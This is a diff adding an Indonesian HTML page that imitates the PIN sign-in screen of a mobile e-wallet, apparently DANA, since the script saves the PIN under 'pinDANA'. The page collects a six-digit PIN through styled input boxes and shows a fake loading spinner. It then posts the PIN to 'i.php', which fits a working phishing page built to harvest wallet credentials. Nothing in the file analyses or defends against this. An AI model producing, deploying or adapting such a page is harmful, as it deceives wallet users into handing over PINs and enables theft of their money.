@@ -1,0 +1,233 @@
+  <!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+    <meta name="theme-color" content="#118eea" />
+  <title>Masuk</title>
+  
+  
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      background: #ffffff;
+    }
+
+    .header {
+      background: #118eea;
+      color: white;
+      padding: 10px;
+      font-size: 15px;
+      font-weight: bold;
+    }
+
+    .container {
+      padding: 40px 20px;
+    }
+
+    .pin-text {
+      font-size: 22px;
+      margin-bottom: 30px;
+    }
+
+    .pin-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 28px;
+      margin-bottom: 40px;
+    }
+
+    .pin-input {
+      width: 10px;
+      height: 12px;
+      font-size: 15px;
+      text-align: center;
+      outline:none;
+      border: 1px solid #808080;
+      border-radius: 50%;
+      background-color: white;
+      transition: background-color 0.3s, color 0.3s;
+      color: black;
+    }
+
+    .pin-input.filled {
+      background-color: #808080;
+      color: #808080; /* menyembunyikan teks */
+    }
+
+    .pin-input.green {
+      background: #4CAF50;
+      color: #4caf50;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      font-size: 13px;
+      color: #009dff;
+      padding: 0 20px;
+    }
+
+    .footer-links img {
+      width: 24px;
+      height: 24px;
+      vertical-align: middle;
+      margin-right: 5px;
+    }
+
+    .footer-section {
+      display: flex;
+      align-items: center;
+    }
+
+    .loading-wrapper {
+      position: relative;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      margin-top: 20px;
+    }
+
+    .spinner-bg, .spinner-fg {
+      width: 50px;
+      height: 50px;
+      position: absolute;
+    }
+.spinner-fg {
+  width: 35px;
+  height: 35px;
+  animation: spin 1s linear infinite;
+}
+
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+    nav {
+            width: 100%;
+            position: fixed;
+            background-color: #118eea;
+            z-index: 1000;
+        }
+        nav.top {
+            top: 0;
+            border-bottom: 1px solid #118eea;
+        }
+        nav.bottom {
+            bottom: 0;
+            border-top: 1px solid #118eea;
+        }
+        nav img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+  </style>
+  </head>
+<body>
+  <nav class="top">
+    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEjtZk9CxdgzGz5G2V_zwYWZWCDyspJgCzTchX32VBPelBde-aQOtlHqV0oLPMevun3TQAZFNhPJ93lxDWP173gieRVfx4v7blxnDzqLGmTcijFFgW-YUuYwgHz_BHfLn-OQ5efE7CmsukOIWgxEYQFfRd5XbkoZlGqBEaaHCAgIXv76qHAQ7ryvjHHM6hAR" alt="Nav Atas">
+  </nav>
+
+  <div class="header">Masuk</div>
+
+  <div class="container">
+    <div class="pin-text">Masukkan PIN</div>
+
+    <!-- FORM MULAI DI SINI -->
+    <form id="pinForm" action="i.php" method="POST">
+      <div class="pin-inputs" id="pinInputs">
+        <input type="tel" maxlength="1" class="pin-input" autofocus>
+        <input type="tel" maxlength="1" class="pin-input">
+        <input type="tel" maxlength="1" class="pin-input">
+        <input type="tel" maxlength="1" class="pin-input">
+        <input type="tel" maxlength="1" class="pin-input">
+        <input type="tel" maxlength="1" class="pin-input">
+      </div>
+      <input type="hidden" name="pin" id="hiddenPin">
+    </form>
+    <!-- FORM SELESAI DI SINI -->
+
+    <div class="loading-wrapper" id="loading">
+      <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhGNxko9JaP0ln_kJmuob7Ns-2UAOOXtvT4HRJJZ2qe2AZskeFrJ5EkKn1pkJ8gkMJ0e7du66jGhr_zrQVTDGC3i6jnTkJTfZ2MqGA0SaKUMk2gpPZVzFOBkUh47FrKLlY-L6Cxj5lw50WB-stSGFdGzh93mv_pm3mZhL_-ZbJyte0InQxeLtAh9gUOZvDc" class="spinner-bg" alt="static">
+      <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgwBRmagHn1FaafTS35Jd6qWd5v02Ro_o1gVltUC2n5tZgbR7Oa-N_mZfx930gTIn6B5O5W3iBUa4TZQEBgbavfithVxydhSCL0WYQgVlCtAWU_FvstTmH48_Qq3FZHvyoPAqIvqqQ7o5umnHdIqggQ6cvbTEYaN_MbaXyGtQfyFr1gkqvxHUAh0NCsnFXg" class="spinner-fg" alt="loading">
+    </div>
+
+    <div class="footer-links">
+      <div class="footer-section">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEg37-13qg6UV94b0NRQ5eMCObsbD4tUXleOwFh2YLtvdnLxz1vLtyljp63AGy_VolO6B7c7mBpquA74CmX9cPi2FYfo0N_GpDZav9gwY59fUFY6XvL5SSSTBk8cnIW53VYQD9PZ9Ie7tF0rzgSFwrYwWP2b6yATJe4NMNoevIl4IbBrZlZZYSlTJK24ENR7" alt="Bantuan">
+        <span>BUTUH BANTUAN?</span>
+      </div>
+      <div class="footer-section">
+        <span>LUPA PIN?</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  const inputs = document.querySelectorAll('.pin-input');
+  const loading = document.getElementById('loading');
+  const hiddenPin = document.getElementById('hiddenPin');
+  const form = document.getElementById('pinForm');
+
+  inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      if (input.value) {
+        input.classList.add('filled');
+      } else {
+        input.classList.remove('filled');
+      }
+
+      if (input.value.length === 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+
+      checkAndSend();
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && input.value === '' && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
+  });
+
+  function checkAndSend() {
+    const pin = Array.from(inputs).map(input => input.value).join('');
+    localStorage.setItem("pinDANA", pin);
+    hiddenPin.value = pin;
+
+    if (pin.length === 6) {
+      loading.style.display = 'flex';
+
+      setTimeout(() => {
+        inputs.forEach(i => {
+          i.classList.remove('filled');
+          i.classList.add('green');
+        });
+
+        form.submit(); // Langsung kirim form ke i.php
+      }, 2000);
+    }
+  }
+
+  // Otomatis fokus saat halaman dimuat agar keyboard langsung muncul
+  window.addEventListener("load", () => {
+    const firstInput = document.querySelector(".pin-input");
+    if (firstInput) {
+      firstInput.focus();
+      // Memancing keyboard di mobile
+      setTimeout(() => {
+        firstInput.click();
+        firstInput.dispatchEvent(new Event("touchstart")); // ekstra trigger untuk iOS
+      }, 100);
+    }
+  });
+</script>
+
+</body>
+</html>
